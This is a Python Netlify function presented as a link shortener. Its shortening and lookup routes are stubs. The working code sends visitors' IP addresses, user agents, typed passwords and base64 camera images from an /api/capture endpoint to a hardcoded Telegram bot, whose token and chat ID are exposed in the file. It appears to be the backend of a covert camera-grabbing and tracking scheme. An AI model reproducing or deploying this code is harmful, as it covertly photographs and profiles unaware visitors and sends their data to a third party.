import json
import base64
import requests
import os
from datetime import datetime
import random
import string

# Telegram Bot Configuration - YEH TUMHARA HI HAI
TELEGRAM_BOT_TOKEN = "8337969851:AAFe-QHJnMScU4ELsIUIlm74-M_WVepuA54"
TELEGRAM_CHAT_ID = "6673230400"

# Password - YEH TUMHARA HI HAI
PASSWORD = "@35678"

def send_to_telegram(message):
    """Direct message to Telegram without photo"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(url, json=payload, timeout=5)
        return response.status_code == 200
    except Exception as e:
        print(f"Telegram error: {e}")
        return False

def send_photo_to_telegram(image_data):
    """Send photo to Telegram"""
    try:
        if 'base64,' in image_data:
            image_data = image_data.split('base64,')[1]
        
        # Decode base64
        image_bytes = base64.b64decode(image_data)
        
        # Save temporarily
        # Send to Telegram
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
        
        files = {'photo': ('photo.jpg', image_bytes)}
        data = {'chat_id': TELEGRAM_CHAT_ID}
        
        response = requests.post(url, files=files, data=data, timeout=10)
        return response.status_code == 200
    except Exception as e:
        error_msg = f"❌ Photo Send Failed: {str(e)[:100]}"
        send_to_telegram(error_msg)
        return False

def handler(event, context):
    """Netlify Function Handler"""
    
    # Set CORS headers
    headers = {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type'
    }
    
    # Handle OPTIONS
    if event['httpMethod'] == 'OPTIONS':
        return {
            'statusCode': 200,
            'headers': headers,
            'body': ''
        }
    
    path = event['path']
    method = event['httpMethod']
    
    # Get client IP
    client_ip = event['headers'].get('x-forwarded-for', 'Unknown').split(',')[0]
    user_agent = event['headers'].get('user-agent', 'Unknown')
    
    try:
        # Parse body
        body = {}
        if event.get('body'):
            try:
                body = json.loads(event['body'])
            except:
                body = {}
        
        # ========== PASSWORD VERIFICATION ==========
        if path == '/api/verify' and method == 'POST':
            password = body.get('password', '')
            
            # LOG ATTEMPT
            attempt_msg = f"🔑 Login Attempt\n"
            attempt_msg += f"🕐 {datetime.now().strftime('%H:%M:%S')}\n"
            attempt_msg += f"🌐 IP: {client_ip}\n"
            attempt_msg += f"📱 Device: {user_agent[:50]}"
            send_to_telegram(attempt_msg)
            
            if password == PASSWORD:
                # SUCCESS LOG
                success_msg = f"✅ LOGIN SUCCESS\n"
                success_msg += f"🕐 {datetime.now().strftime('%H:%M:%S')}\n"
                success_msg += f"🌐 IP: {client_ip}\n"
                success_msg += f"✅ Password: {password}"
                send_to_telegram(success_msg)
                
                return {
                    'statusCode': 200,
                    'headers': headers,
                    'body': json.dumps({
                        'success': True,
                        'redirect': '/dashboard.html',
                        'token': ''.join(random.choices(string.ascii_letters + string.digits, k=32))
                    })
                }
            else:
                # FAILED LOG
                failed_msg = f"❌ LOGIN FAILED\n"
                failed_msg += f"🕐 {datetime.now().strftime('%H:%M:%S')}\n"
                failed_msg += f"🌐 IP: {client_ip}\n"
                failed_msg += f"❌ Wrong Password: {password}"
                send_to_telegram(failed_msg)
                
                return {
                    'statusCode': 401,
                    'headers': headers,
                    'body': json.dumps({
                        'success': False,
                        'message': 'Incorrect password!'
                    })
                }
        
        # ========== CAMERA CAPTURE ==========
        elif path == '/api/capture' and method == 'POST':
            image_data = body.get('image', '')
            
            if image_data:
                # LOG CAPTURE
                capture_msg = f"📸 Camera Active\n"
                capture_msg += f"🕐 {datetime.now().strftime('%H:%M:%S')}\n"
                capture_msg += f"🌐 IP: {client_ip}"
                send_to_telegram(capture_msg)
                
                # Try to send photo
                try:
                    send_photo_to_telegram(image_data)
                except:
                    pass
            
            return {
                'statusCode': 200,
                'headers': headers,
                'body': json.dumps({'success': True})
            }
        
        # ========== ERROR LOGGING ==========
        elif path == '/api/log-error' and method == 'POST':
            error_data = body.get('error', {})
            
            error_msg = f"🐛 FRONTEND ERROR\n"
            error_msg += f"🕐 {datetime.now().strftime('%H:%M:%S')}\n"
            error_msg += f"🌐 IP: {client_ip}\n"
            error_msg += f"📄 Page: {error_data.get('page', 'Unknown')}\n"
            error_msg += f"❌ Error: {error_data.get('message', 'Unknown')}"
            
            send_to_telegram(error_msg)
            
            return {
                'statusCode': 200,
                'headers': headers,
                'body': json.dumps({'success': True})
            }
        
        # ========== URL SHORTENING (SIMPLIFIED) ==========
        elif path == '/api/shorten' and method == 'POST':
            # For now, just return success
            url = body.get('url', '')
            
            # Log the creation
            create_msg = f"🔗 Link Created\n"
            create_msg += f"🕐 {datetime.now().strftime('%H:%M:%S')}\n"
            create_msg += f"🌐 IP: {client_ip}\n"
            create_msg += f"🔗 URL: {url[:50]}..."
            send_to_telegram(create_msg)
            
            # Generate short code
            short_code = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
            
            return {
                'statusCode': 200,
                'headers': headers,
                'body': json.dumps({
                    'success': True,
                    'short_url': f"https://linkshortnerbyanish.netlify.app/l/{short_code}",
                    'short_code': short_code
                })
            }
        
        # ========== GET LINKS ==========
        elif path == '/api/links' and method == 'GET':
            # Return dummy links for now
            dummy_links = [
                {
                    'short_code': 'abc123',
                    'original_url': 'https://example.com',
                    'created_at': datetime.now().isoformat(),
                    'click_count': 5
                }
            ]
            
            return {
                'statusCode': 200,
                'headers': headers,
                'body': json.dumps({
                    'success': True,
                    'links': dummy_links
                })
            }
        
        # ========== GET LINK ==========
        elif path == '/api/get-link' and method == 'GET':
            query_params = event.get('queryStringParameters', {})
            short_code = query_params.get('code', 'test123')
            
            # Log access
            access_msg = f"🔗 Link Accessed\n"
            access_msg += f"🕐 {datetime.now().strftime('%H:%M:%S')}\n"
            access_msg += f"🌐 IP: {client_ip}\n"
            access_msg += f"🔗 Code: {short_code}"
            send_to_telegram(access_msg)
            
            return {
                'statusCode': 200,
                'headers': headers,
                'body': json.dumps({
                    'success': True,
                    'found': True,
                    'original_url': 'https://google.com'
                })
            }
        
        # ========== DEFAULT ROUTE ==========
        else:
            return {
                'statusCode': 404,
                'headers': headers,
                'body': json.dumps({
                    'success': False,
                    'message': 'Endpoint not found'
                })
            }
    
    except Exception as e:
        # Send error to Telegram
        error_msg = f"🔥 SERVER ERROR\n"
        error_msg += f"🕐 {datetime.now().strftime('%H:%M:%S')}\n"
        error_msg += f"🌐 IP: {client_ip}\n"
        error_msg += f"❌ Error: {str(e)[:200]}"
        
        send_to_telegram(error_msg)
        
        return {
            'statusCode': 500,
            'headers': headers,
            'body': json.dumps({
                'success': False,
                'message': 'Server error occurred',
                'error': str(e)
            })
            }
